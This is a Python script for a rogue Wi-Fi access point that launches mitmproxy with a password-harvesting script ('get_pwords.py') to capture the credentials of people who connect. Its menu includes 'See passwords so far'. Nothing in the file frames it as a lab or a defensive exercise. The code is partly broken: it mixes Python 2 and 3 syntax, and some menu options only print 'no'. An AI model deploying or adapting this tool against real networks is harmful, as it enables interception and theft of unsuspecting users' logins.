import sys, os, subprocess, tempfile, datetime, time, signal, string, random

class MITM_Main:

	def __init__(self):
		self.isUp = False
		self.usb_int = "wlan0"
		self.mon_int = "wlan0mon"
		self.mon_mode = False
		self.welcome()

	def new_user_id(self):
		ide = ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits + string.ascii_lowercase) for _ in range(8))
		return ide

	def switch_ap_on(self):
		if not self.isUp:
			idee = self.new_user_id()
			print("switching on access point...")
			pid = os.fork()
			if pid > 0:
				os.system("sudo xterm -e ./RAP.sh start")
				os.wait()
				os.kill(pid, signal.SIGTERM)
			print("waiting for RAP.sh to finish...")
			time.sleep(15)
			self.isUp = True
			pid2 = os.fork()
			if pid2 > 0:
				os.system("sudo xterm -e ./RAP2.sh")
				os.wait()
				os.kill(pid2, signal.SIGTERM)
			time.sleep(15)
			print("starting mitmproxy...")
			pid3 = os.fork()
			if pid3 > 0:
				os.system("sudo xterm -e mitmdump -T --host -q -s 'get_pwords.py --" + idee + "' ")
				os.wait()
				os.kill(pid3, signal.SIGTERM)
			now = datetime.datetime.now()
			print"access point started at " + str(now)
		else:
			print("access point is already up")

	def switch_ap_off(self):
		if not self.isUp and not self.mon_mode:
			print("ap isnt even on")
		else:
			pid = os.fork()
			if pid > 0:
				os.system("sudo xterm -e ./RAP.sh stop")
				os.kill(pid, signal.SIGTERM)
			self.isUp = False
			print("access point switched off")

	def welcome(self):
		print("*****HEY THERE*****")
		picd = True
		while picd:
			resp = input("please select an option number:\n" \
							"1.Switch Access Point On\n" \
							"2.Switch Access Point Off\n" \
							"3.See AP Details\n"\
							"4.See passwords so far\n"\
							"5.exit\n")
			try:
				resp = int(resp)
			except ValueError:
				pass
			if resp not in range(1,6):
				pass
			else:
				picd = False
		if resp == 1:
			self.switch_ap_on()
			self.welcome()
		elif resp == 2:
			self.switch_ap_off()
			self.welcome()
		elif resp == 3:
			print("no")
			self.welcome()
		elif resp == 4:
			print("no")
			self.welcome()
		elif resp == 5:
			os.system("sudo pkill airodump-ng && sudo pkill python") 
			sys.exit(0)


if __name__ == "__main__":
	mal = MITM_Main()


